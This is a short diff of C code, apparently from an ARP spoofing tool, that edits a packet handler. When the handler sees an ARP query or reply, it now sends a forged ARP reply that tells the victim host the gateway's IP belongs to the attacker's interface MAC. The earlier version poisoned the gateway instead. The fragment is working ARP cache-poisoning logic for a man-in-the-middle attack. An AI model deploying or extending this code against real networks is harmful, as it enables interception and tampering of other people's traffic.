@@ -198,17 +198,17 @@ void handle_arp(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* pac
         YELLOW();
         printf("[Query ] ");
         printf("who's ip is %s, please tell me your mac\n", inet_ntoa(temp_addr));
-    //    send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
-    send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
+    //send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
         CLOSE();
+        send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
     } else if(ntohs(arp_hdr->opcode) == ARP_ANS) {
         GREEN();
         printf("[Answer] ");
         printf("my ip is %s\n", inet_ntoa(*(struct in_addr *)&arp_hdr->src_ip));
         printf("And my mac is %s\n", ether_ntoa((const struct ether_addr *)&arp_hdr->src_mac));
-    send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
-    //    send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
+    //send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
         CLOSE();
+        send_arp_packet((pcap_t *)arg, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
     }
 
     return ;
